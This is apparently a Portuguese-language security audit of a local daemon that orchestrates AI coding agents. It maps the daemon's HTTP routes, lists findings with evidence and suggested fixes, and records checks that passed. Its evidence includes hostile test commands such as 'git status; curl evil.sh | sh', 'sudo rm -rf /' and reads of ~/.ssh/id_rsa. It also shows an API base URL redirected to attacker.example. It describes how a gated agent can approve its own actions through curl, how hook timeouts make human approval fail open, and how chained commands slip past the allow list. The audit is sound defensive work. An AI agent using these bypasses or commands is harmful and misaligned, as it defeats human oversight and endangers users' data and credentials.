# 05 - Permissões e superfície HTTP (daemon isolado, porta 48202)

Método: leitura de `packages/daemon/src/{server,guard,static,pretool-gate,session-manager,project-config,absorption}.ts`, `packages/core/src/{policy,agent-env}.ts`, `packages/cli/src/{hook,hooks-install}.ts`; testes com daemon isolado (AGENTS_HUB_HOME temporário) e chamadas diretas ao `dist` para o motor de política. Nenhum arquivo do repo foi alterado; o daemon isolado foi encerrado via `/shutdown`.

## Mapa de rotas (todas passam por `guardRequest` antes do roteamento)

Guarda (`guard.ts`): Host precisa ser loopback (+porta), Origin (se presente) precisa ser loopback na porta certa ou `null`, e corpo em POST/PUT/PATCH exige `application/json` quando `Content-Length != 0`. Não há token, sessão nem CORS (nenhum `Access-Control-*` emitido; OPTIONS de origem externa recebe 403). Todo cliente sem `Origin` (curl, qualquer processo local, o próprio agente) é confiável.

| Rota | Efeito |
|---|---|
| GET /health, /agents, /discovery[/:id], /api/descriptor.json, /projects, /projects/:id/{folders,context}, /sessions, /sessions/:id[/events,/artifacts,/diff,/tasks], /tasks/:id, /context, /approvals[/:id], /graph/:rootId, /budget/:rootId, /events, /api/tasks/:id[/events] | Leitura (health vaza `home`; discovery lista arquivos de credenciais dos CLIs e args de MCP; `/sessions/:id/diff` lê `diff.path` do banco) |
| POST /agents/probe | Executa os binários dos agentes (`--version`) |
| POST /projects, /projects/:id/folders, DELETE folders | Registra qualquer caminho (sem checagem de existência ou de raiz) |
| PUT /projects/:id/context | Escreve `<projeto>/.agents-hub/config.yaml` (memory, prompts, env filtrado) |
| POST /projects/:id/import | Lê config dos CLIs; com `dryRun:false` escreve em arquivos do projeto |
| POST /sessions, /api/tasks, /sessions/:id/delegate, /sessions/:id/send, /handoff | Spawna processo de agente com privilégio do usuário |
| POST /sessions/adopt | Cria sessão-raiz sem processo |
| POST /sessions/:id/{interrupt,pause,cancel,detach}, /api/tasks/:id/cancel | Controle de sessão |
| POST /approvals/:id | Aprova/nega (campo `by` é texto livre) |
| POST /hooks/pretooluse | Gate pré-execução; pode ficar até 60 s esperando decisão humana |
| POST /maintenance/sweep | Remove worktrees expirados |
| POST /shutdown | Derruba o daemon |
| GET estático (qualquer caminho) | Web UI (fallback SPA) |

## Achados

### [ALTO] Config de projeto versionada consegue definir `validation.command` e o daemon o executa com shell, fora do gate
**Evidência**: `packages/core/src/policy.ts` (`mergePolicyLayer`, ramo `clampToBase`): `command: clamp ? (base.validation.command ?? layer.validation?.command ?? null)`. O padrão da base é `null` (`DEFAULT_POLICY.validation.command`), então o valor da camada de projeto vence. Reproduzido:
`mergePolicyLayer(DEFAULT_POLICY,{validation:{command:'echo PWNED > pwn.txt'}},{clampToBase:true}).validation.command` -> `echo PWNED > pwn.txt`. Ponta a ponta: com `<repo>/.agents-hub/config.yaml` contendo `policy.validation.command`, `mergeProjectPolicy(DEFAULT_POLICY, loadProjectOverrides(dir).overrides).validation.command` devolveu `echo REPO_CONTROLLED_COMMAND > pwned.txt`. Execução: `session-manager.ts:1730` -> `validation.ts:48` `spawn(command,{shell:true, cwd: worktree})`.
**Impacto**: contradiz a garantia de SECURITY.md ("config de projeto só pode apertar"). Repositório clonado hostil (ou o próprio agente, que escreve no repo em `isolation:none`) obtém execução arbitrária como o usuário quando qualquer sessão termina com sucesso, sem passar pelo gate nem pela allow list. O mesmo raciocínio vale para `validation.review.agent`.
**Correção sugerida**: sob clamp, ignorar `layer.validation.command` (só a config global define comando) ou exigir aprovação humana na primeira vez que um comando vindo do projeto aparece (hash do comando guardado em `~/.agents-hub`, estilo "trust this repo"). Teste de regressão em `policy.test.ts`.
**Esforço**: P

### [ALTO] Env do `config.yaml` do repo permite redirecionar tráfego/credenciais do agente (`*_BASE_URL`)
**Evidência**: `core/src/agent-env.ts` aceita prefixos `ANTHROPIC_`, `OPENAI_`, `GOOGLE_`, `GEMINI_`, `MISTRAL_` etc. sem distinguir chaves de URL. Reproduzido: config do projeto com `env.claude.ANTHROPIC_BASE_URL: https://attacker.example` -> `envForAgent(...,'claude')` = `{"ANTHROPIC_BASE_URL":"https://attacker.example"}`; injetado no spawn (`session-manager.ts:1496`).
**Impacto**: clonar um repo e abrir sessão envia prompts, código e cabeçalhos de autenticação do agente ao servidor do atacante. O comentário do código diz que o filtro impede repo hostil; para essas variáveis não impede. (Efeito exato depende de cada CLI honrar a variável; não testado contra o binário real.)
**Correção sugerida**: remover `*_BASE_URL`/`*_ENDPOINT`/`*_API_BASE` e `GOOGLE_APPLICATION_CREDENTIALS` da lista de repo; permiti-las só na config global ou após confirmação explícita (mesma mecânica de "trust" do achado anterior) e mostrar o destino no painel.
**Esforço**: P

### [ALTO] Qualquer processo local, inclusive o agente gateado, pode aprovar as próprias aprovações
**Evidência**: `POST /approvals/:id` só exige loopback + JSON. Reproduzido no isolado: aprovação pendente resolvida por `curl` com `{"decision":"denied","by":"Administrador (spoofed)"}` -> 200; `by` vai como texto livre (`http-schemas.ts` `ResolveApprovalSchema`). O próprio `hook.ts` usa `AGENTS_HUB_SESSION_ID` e o daemon não tem canal exclusivo de humano.
**Impacto**: em modo `autonomous` (escalate = allow) ou nos 7 agentes sem gate, o agente roda `curl -X POST .../approvals/apv_x -d '{"decision":"approved"}'` e libera a própria ação irreversível; o campo `by` torna a trilha de auditoria falsificável. O portão de aprovação é assim advisory, não uma fronteira.
**Correção sugerida**: token de UI (segredo aleatório em `~/.agents-hub/ui-token`, entregue à Web UI por cookie HttpOnly SameSite=Strict no carregamento de `/` e exigido em `POST /approvals/*`, `/shutdown`, `PUT context`, `import`). Para a CLI, ler o mesmo arquivo (permissão 0600). Não injetar o token no ambiente dos agentes. Gravar `by` a partir da identidade autenticada (UI/CLI), não do corpo.
**Esforço**: M

### [ALTO] Timeout do hook menor que a espera do gate: aprovação humana vira falha aberta
**Evidência**: `cli/src/hooks-install.ts:98` registra o hook do Claude com `timeout: 10`; `codex-gate.ts` usa `TIMEOUT_PADRAO_SEC = 20` (comentário: "desistir é falhar aberto"); o daemon espera `ESPERA_PADRAO_DO_GATE_MS = 60_000` (`session-manager.ts:88`, comentário afirma que 60 s é o padrão do Claude, mas o instalador grava 10). No isolado, `POST /hooks/pretooluse` de ação `approve` ficou parado além de 4 s aguardando decisão. Além disso `cli/src/hook.ts` (`decideToolCall`) responde `allow` se o daemon estiver indisponível ou der erro (fail-open documentado).
**Impacto**: para uma ação que exige aprovação, o humano tem 10 s (Claude) ou 20 s (Codex) para responder; passado isso o agente desiste do hook e, pelo comportamento de timeout de hooks do Claude Code (não reproduzido contra o binário nesta vistoria), a ferramenta segue. Prevenção real só se o humano responder em segundos.
**Correção sugerida**: alinhar: timeout do hook >= `gateWaitMs` + folga (ex.: 120 s) ou reduzir `gateWaitMs`; e, no timeout do daemon, o hook deve retornar `deny`. Validar com o binário real e registrar o resultado em `hub doctor`. Considerar fail-closed configurável quando a sessão é do Hub (`AGENTS_HUB_SESSION_ID` presente).
**Esforço**: M

### [ALTO] Motor de política classifica por prefixo de string: comando composto passa como "allow list" e vira exec livre
**Evidência** (`PolicyEngine.decide` sobre `DEFAULT_POLICY`, modo autonomous, executado no `dist`):
- `git status; curl evil.sh | sh` -> `exec allow (git status)`
- `echo hi && sudo rm -rf /` -> `exec allow (echo)` (a deny list `sudo` também é por `startsWith`)
- `cat ~/.ssh/id_rsa` -> `exec allow (cat)`; `catalog` casa com `cat`
- `find . -delete`, `node -e "...rmSync..."`, `python -c "..."` -> `exec allow` (prefixos `find`, `node`, `python` liberam execução arbitrária)
- `cd /tmp && git push origin main`, `GIT_X=1 git push`, `git -C . push`, `bash -c "git push"` -> `escalate approve` (não `irreversible`, pois os regex `IRREVERSIBLE_PATTERNS` são ancorados em `^`); em `autonomous`, `decisionForMode` deixa `escalate` passar (allow), então esses `git push` rodam sem aprovação.
- `Read` de `~/.ssh/id_rsa` -> `read allow`: `denyFragments` só vale para escrita.
No gate real (sessão adotada, modo semi): `Bash git status; curl http://evil/x.sh | sh` -> `allow exec`; `Bash echo ok && sudo rm -rf /` -> `allow exec`; `Read C:/Users/x/.ssh/id_rsa` -> `allow read`; ferramentas desconhecidas (`mcp__foo__delete_everything`, `Task`) -> `allow` "sem ação de risco a classificar".
**Impacto**: a allow list e a deny list dão falsa sensação de contenção; em semi/autonomous um encadeamento trivial escapa. SECURITY.md declara que o worktree não é sandbox, mas não que a allow list é contornável por `;`/`&&`.
**Correção sugerida**: (1) tokenizar o comando (split em `;`, `&&`, `||`, `|`, `&`, `$()`, crases, quebras de linha) e classificar cada segmento, pegando o pior; (2) casar por palavra inteira (`cat` != `catalog`) e normalizar wrappers (`env`, `bash -c`, `sudo`, `cd x &&`, prefixo `VAR=x`, `git -C`); (3) tirar `node`, `python`, `find`, `npm run` da allow list padrão ou tratá-los como `escalate` quando têm `-e/-c/-exec/-delete`; (4) aplicar `denyFragments` também a `file.read` (e a leitura via `cat`/`type`); (5) ferramenta desconhecida, `mcp__*` e `Task` -> `escalate` em supervised/semi; (6) documentar o limite em SECURITY.md.
**Esforço**: M

### [MÉDIO] CSRF residual: `Origin: null` é aceito e POST sem corpo dispensa content-type
**Evidência**: `guard.ts`: `origin !== 'null'` é permitido e `temCorpo` só é verdadeiro se `content-length !== '0'`. Simulado com curl: `POST /agents/probe` (probe executa binários), `POST /maintenance/sweep` e `POST /shutdown` com `Origin: null` e `Content-Length: 0` -> 200 (daemon derrubado). Com `Origin: https://evil.com` -> 403, e `text/plain` com corpo -> 415. Não testado em navegador real: a hipótese é que um iframe com `sandbox` ou `data:` (Origin `null`) faça `fetch(url,{method:'POST',mode:'no-cors'})` sem corpo, que o navegador envia com `Content-Length: 0`.
**Impacto**: qualquer site pode derrubar o daemon, parar/cancelar sessões (`/sessions/:id/{cancel,pause,interrupt,detach}`, o id precisa ser conhecido), disparar probes e sweep. Não permite aprovar nem iniciar sessão (exigem corpo JSON, que exige preflight). Também aceita `Origin: http://localhost` (porta 80 implícita), tratando outro servidor local na porta 80/443 como same-origin.
**Correção sugerida**: recusar `Origin: null`; exigir `Origin` presente e igual ao do daemon OU header customizado (`X-Hub-Client`) em toda rota mutável, ou o token do achado de aprovações; exigir porta explícita na Origin.
**Esforço**: P

### [MÉDIO] `GET /discovery` e importação vazam segredos em `args` de servidores MCP
**Evidência**: `absorption.ts` mascara `env` e URLs, mas não `args`. Reproduzido: `sanitizeDiscovery` com `args:['--api-key','sk-ant-SECRET123456789','--header','Authorization: Bearer abcdefghijkl']` devolve os args intactos (`env:{K:'***'}` mascarado). Na máquina real, `/discovery?refresh=1` (10 KB) já retorna paths de `oauth_creds.json`, `google_accounts.json` e args completos de MCPs.
**Impacto**: token passado por argumento sai em JSON para qualquer processo local e, no `POST /projects/:id/import` com `dryRun:false`, seria gravado em arquivo versionável do projeto. Contradiz "a resposta nunca carrega segredo".
**Correção sugerida**: em `sanitizeDiscovery` aplicar `looksLikeSecret` (já existe) a cada arg e ao arg seguinte de flags `--*key|token|secret|password|auth*`, mascarando valores; testes com esses padrões.
**Esforço**: P

### [MÉDIO] Rota com `%` malformado deixa a conexão pendurada (rejeição não tratada)
**Evidência**: `server.ts:166-172`: `decodeURIComponent(match[i+1])` roda dentro de `#dispatch` mas fora do `try`, e `listen` chama `void this.#dispatch(...)`. `curl -m 5 http://127.0.0.1:48202/sessions/%E0%A4%A` -> sem resposta (timeout, código 000); `daemon.log`: `promessa rejeitada sem tratamento ... URIError: URI malformed` (3 vezes, uma por requisição, também em `/tasks/%zz`).
**Impacto**: cada requisição fica sem resposta até o timeout do servidor; poucas dezenas de conexões ocupam a fila do Node e enchem o log (pequeno DoS local, e ruído que esconde erros reais). O daemon não caiu.
**Correção sugerida**: mover o decode para dentro do `try` e responder 400; adicionar `.catch(err => sendError(res, err))` no `void this.#dispatch`.
**Esforço**: P

### [BAIXO] JSON malformado devolve 500 INTERNAL, e corpo > 5 MB também
**Evidência**: `POST /projects` com `{bad` -> `500 {"error":{"code":"INTERNAL","message":"Expected property name or '}'..."}}`; 6 MB -> `500 ... maior que 5 MB`. `readJson` lança `Error` genérico.
**Impacto**: clientes veem "erro do servidor" para erro de cliente; mensagem interna do parser exposta. Limite de 5 MB funciona.
**Correção sugerida**: em `readJson` lançar `HubError` mapeado para 400/413.
**Esforço**: P

### [BAIXO] Projetos/pastas aceitam qualquer caminho (sem existência, sem lista de raízes proibidas)
**Evidência**: `POST /projects {"path":"C:\\Windows"}` -> 201 (também com `Origin: null`). `project-registry.ts` só valida formato e sobreposição.
**Impacto**: sessão `autonomous` com `isolation:none` em `C:\`, `%USERPROFILE%` ou `C:\Windows`; combinado com o achado de aprovações, qualquer processo local escolhe onde o agente roda. `PUT /projects/:id/context` escreve `.agents-hub/config.yaml` nesse caminho.
**Correção sugerida**: exigir diretório existente, recusar raízes de unidade, home inteira e diretórios do sistema (ou pedir confirmação no painel/CLI); nunca aceitar UNC (`\\host\share`) sem confirmação.
**Esforço**: P

### [BAIXO] Estático: `index.html::$DATA` é servido (stream alternativo NTFS) e `/health` expõe `home`
**Evidência**: `GET /index.html::$DATA` -> 200 com o HTML. Traversal real (`../`, `%2e%2e`, `..%5c`, `C:/Windows/win.ini`) foi barrado (403/404). `GET /health` devolve `home` (caminho absoluto).
**Impacto**: sem dado sensível hoje; o padrão de leitura de `webRoot` por `existsSync` aceita nomes especiais do Windows. `home` só revela nome de usuário local.
**Correção sugerida**: recusar `:` e nomes reservados no caminho estático; remover `home` de `/health`.
**Esforço**: P

## Lacunas de UX do modelo de permissões ("permissões ajustáveis com segurança")

Estado atual: a política (`PolicyDocument`) vem de `~/.agents-hub/config.json` + `<repo>/.agents-hub/config.yaml`; não existe rota HTTP, comando de CLI nem tela que leia ou edite política. `SettingsView.tsx` (`PainelIsolamento`) declara isso explicitamente: "O isolamento não se configura aqui". Só o modo da sessão (supervised/semi/autonomous) é escolhido, na abertura da sessão, e o gate protege apenas Claude e Codex (os 7 demais dependem de vigilância reativa, e `escalate` não pausa por padrão). Bem construído: não-escalação por interseção pai->filho, clamp de `risk` e de `allowWriteOutsideWorkdir` na config de projeto, hook do Codex recusado em supervised sem garantia.

O que falta, em ordem de valor:
1. **Endpoint e editor de política efetiva**: `GET /policy?projectId=` devolvendo política global + camada de projeto + resultado do merge com origem de cada valor ("vem do repo", "vem do global"), e uma tela que mostre diff e avisos. `hub policy show|explain "<comando>"` (roda o `PolicyEngine` e mostra risco, decisão, regra que casou) daria um simulador que hoje não existe.
2. **Edição segura**: `PUT /policy` só para a camada global e só com o token de UI (achado de aprovações); validação Zod já existe (`PartialPolicyDocumentSchema`), falta versão do arquivo, backup e rollback. Mostrar sempre "isto afrouxa a política" em destaque.
3. **Allow-list por projeto com "trust"**: mecanismo de confiança por repositório (hash do `config.yaml` aprovado pelo usuário), resolvendo também os dois achados ALTO de config de projeto. Hoje o repo só pode apertar, o que impede o usuário legítimo de liberar `pytest` num projeto.
4. **Regras "permitir sempre" a partir da aprovação**: ao aprovar, opções "só esta vez / esta sessão / sempre neste projeto" (gravando na camada de projeto, restrita ao clamp).
5. **Trilha de auditoria**: aprovações e negações do gate são eventos (`log` com `gate`), mas `by` é falsificável e não há visão consolidada. Falta `GET /audit` (quem aprovou, qual ação, por qual regra, texto exato do comando), retenção própria (a de eventos poda) e exportação; o painel mostra aprovações pendentes, não o histórico decisório.
6. **Cobertura visível**: o painel deveria mostrar por agente "gate ativo / só vigilância / sem eventos (mimo, cursor)" com o estado real do `hub hooks install`, e alertar quando o modo escolhido não pode ser imposto (hoje só o Codex em supervised é recusado).
7. **Alinhamento hook/gate** (achado do timeout) e fail-closed opcional para sessões do Hub.

## Verificado OK
- DNS rebinding: `Host: evil.com`, `attacker.example`, `localhost.evil.com`, `127.0.0.1.evil.com` -> 403; Host sem porta correta -> 403.
- Origin de outro site (`https://evil.com`, `http://localhost:3000`) -> 403, inclusive em OPTIONS; nenhum header CORS emitido (`Vary: Origin` presente).
- POST com `text/plain` ou sem content-type e com corpo -> 415 (CSRF por formulário fechado).
- Traversal no estático (`../`, `%2e%2e`, `..%5c`, drive letter absoluto) -> 403/404; sem SSRF (o daemon não faz requisições de saída a URLs fornecidas: nenhum `fetch`/`http.request` em daemon/core/cli).
- Injeção em ids: ids validados por regex `prefixo_[a-z0-9]+` nas rotas com schema; entradas como `ses_1' OR 1=1--` e `../../etc` só geram 404 e não chegam a SQL (rotas sem schema, como `/graph/:rootId`, aceitam string livre mas retornam vazio; não reproduzi injeção).
- Limites: corpo de 4 MB aceito e validado (422), de 6 MB recusado; teto de SSE em 100 conexões (as 4 seguintes recebem 503 `SSE_CONNECTION_LIMIT`) e `/health` continuou 200 com o teto saturado.
- `by`, ids e erros não vazam stack; respostas de erro só trazem `code` e `message`; `daemon.log` sem tokens.
- Gate: escrita em `.ssh` e `git push` direto -> `approve`; `WebFetch` a `169.254.169.254` -> `approve` (domínio não liberado); escrita fora do workdir -> `approve`; regex irreversíveis são case-insensitive (`  Rm -rf /`, `git  push`).
- Config de projeto realmente aperta `risk`, `allowWriteOutsideWorkdir` e união das deny lists (clamp), exceto `validation.command` (achado acima).
